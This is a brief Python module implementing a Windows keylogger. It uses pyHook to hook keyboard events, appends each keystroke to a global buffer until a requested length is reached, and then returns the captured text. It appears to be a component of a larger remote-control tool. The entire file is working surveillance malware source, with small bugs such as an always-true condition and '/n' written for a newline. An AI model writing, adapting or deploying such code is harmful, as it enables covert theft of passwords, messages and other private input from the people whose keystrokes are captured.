import win32api 
import sys
import pythoncom, pyHook 
import os

keysPressed = ">"
def OnKeyboardEvent(event):
    global keysPressed    
    if event.Ascii != 0 or 8: 
        keysPressed += chr(event.Ascii) 
    if event.Ascii == 13: 
        keysPressed += "/n"
    return True

def keylogger(size):
    if  os.name=="nt":
        return keylogger_win(size)
    else:
        return "Not available"

def keylogger_win(size):       
    global keysPressed   
    hm = pyHook.HookManager()  
    hm.KeyDown = OnKeyboardEvent 
    hm.HookKeyboard() 
    while len(keysPressed) < int(size):
        pythoncom.PumpWaitingMessages()
    else:
        keys = keysPressed
        keysPressed = ">"
        hm.UnhookKeyboard()
        return keys